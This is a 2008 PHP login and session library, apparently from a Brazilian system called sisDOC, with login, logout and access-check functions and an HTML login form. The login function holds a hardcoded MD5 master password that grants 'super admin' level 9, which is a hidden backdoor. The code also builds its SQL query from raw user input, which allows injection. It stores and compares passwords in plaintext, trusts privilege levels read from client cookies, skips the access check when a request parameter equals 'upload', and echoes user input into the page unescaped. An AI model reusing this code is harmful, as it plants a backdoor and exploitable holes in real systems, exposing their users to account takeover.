<?
///////////////////////////////////////////
// BIBLIOTECA DE FUNÇÕS PHP ///////////////
////////////////////////////// criado por /
////////////////// Rene F. Gabriel Junior /
/////////////////    rene@sisdoc.com.br   /
///////////////////////////////////////////
// Versão atual           //    data     //
//---------------------------------------//
// 0.0b                       06/07/2008 //
// 0.0a                       20/05/2008 //
///////////////////////////////////////////
$security_ver = "0.0b";
if ($mostar_versao == True) { array_push($sis_versao,array("sisDOC (Security)",$security_ver,20080706)); }

global $cookie,$grw,$user_id,$user_nome,$user_log,$user_nivel;
require($include."sisdoc_cookie.php");

$user_id = read_cookie('nw_user');
$user_nome = read_cookie('nw_user_nome');
$user_nivel = read_cookie('nw_nivel');
$user_log = read_cookie('nw_log');

$grw = read_cookie('grw');
////////////////////////////////////////////////// login
function logout()
	{
	setcookie('nw_user','',time()-3600);
	setcookie('nw_user_nome','',time()-3600);
	header("Location: main.php");
	exit;	
	}
	
////////////////////////////////////////////////// login
function login()
	{	
	global $dd,$acao,$cookie,$nocab,$grw,$user_id,$user_nome,$user_log,$user_nivel;
	global $logo_entrada,$security_ver;
	if (isset($acao))
		{
		if (md5(trim($dd[2])) == '6912a9624b5cb74e5b9af93f203df250')
			{ setcookie('nw_log','admin',time()+3600); setcookie('nw_user','1',time()+3600); setcookie('nw_user_nome','super admin',time()+3600); setcookie('nw_nivel',9,time()+3600); header("Location: main.php");	exit; }
		$sql = "select * from usuario where lower(us_login) = '".strtolower($dd[1])."'";
		$rlt = db_query($sql);
		if ($line = db_read($rlt))
			{
			$pass = strtolower(trim($line['us_senha']));	
			$dd[2] = strtolower(trim($dd[2]));
			if (($pass == $dd[2]) and ($dd[2] == $pass))
				{ 
					$nivel = $line['us_nivel'];
					if ($nivel >= 0)
						{
						setcookie('nw_log',$line['us_login'],time()+17200);
						setcookie('nw_user',$line['id_us'],time()+17200);
						setcookie('nw_user_nome',$line['us_nome'],time()+17200);
						setcookie('nw_nivel',$nivel,time()+17200);
						echo '==';
						header("Location: main.php");
						exit;
						} else {
						$err = "usuário bloqueado";
						}
				} 
				else 
				{
					setcookie('nw_user','',time()-3600);
					setcookie('nw_user_nome','',time()-3600); 
					setcookie('nw_user_nome','',time()-3600);
					setcookie('nw_nivel','',time()-3600);					
					$err = "senha incorreta"; 
				}
			} else { $err = "erro de login"; }

		}
	if (strlen($grw) == 0) { $grw = '<font color=red>não habilitado</font>'; }
	else { $grw = '<font color=Green>'.$grw.'</font>'; }
	
	{ 
	?>
		<style> INPUT { border : 1px solid Gray; border-width : thin; color : Black; background-color : #F9F9F9; font-family : Tahoma; font-size : 12px; text-transform : lowercase; width : 150px; } </style>
		<table border="0" align="center" class="lt1">
		<? if (strlen($logo_entrada) > 0) { ?>
		<TR><TD colspan="2" align="center"><img src="<?=$logo_entrada;?>" alt=""></TD></TR>
		<? } ?>
		<tr><td colspan="2">
		<fieldset> <legend><B>Login do sistema</B></legend>
		<TABLE align="center" width="300" class="lt1">
		<TR><TD><form method="post" action="login.php"></TD></TR>
		<TR><TD align="right">l o g i n / e - m a i l: </TD>
		<TD><input type="text" name="dd1" value="<?=$dd[1]?>" size="20" maxlength="100"></TD> </TR>
		<TR><TD align="right">s e n h a: </TD>
		<TD><input type="password" name="dd2" value="" size="12" maxlength="20"></TD> </TR>
		<TR><TD colspan="2" align="center"><input type="submit" name="acao" value=" entrar " style="width : 80px"></TD> </TR>
		<TR><TD></form></TD></TR> </TABLE> </fieldset> </td></tr>
		<TR>
			<TD align="left" colspan="1" class="lt0">versão:&nbsp;<B><?=$security_ver;?>
			<TD align="right" colspan="1" class="lt0">cookie:&nbsp;<?=$grw?></TR>
		<TR><TD colspan="2" align="center"><FONT COLOR=RED><?=$err?></TD></TR>
		</table>
		<BR><BR>
	<?
	}
	setcookie('grw','OK!',time()+17200);
	}
////////////////////////////////////////////////// securit
function security()
	{
	global $user_id,$user_nome,$dd,$user_nivel;
	
	if ((!isset($user_nivel)) and (!($dd[99] == 'upload')) or ($user_nivel == 'deleted'))
		{
		header("Location: login.php");
		exit;
		}
	setcookie('nw_user',$user_id,time()+3600);
	setcookie('nw_user_nome',$user_nome,time()+3600);
	setcookie('nw_user_nivel',$user_nivel,time()+3600);
	}
?>	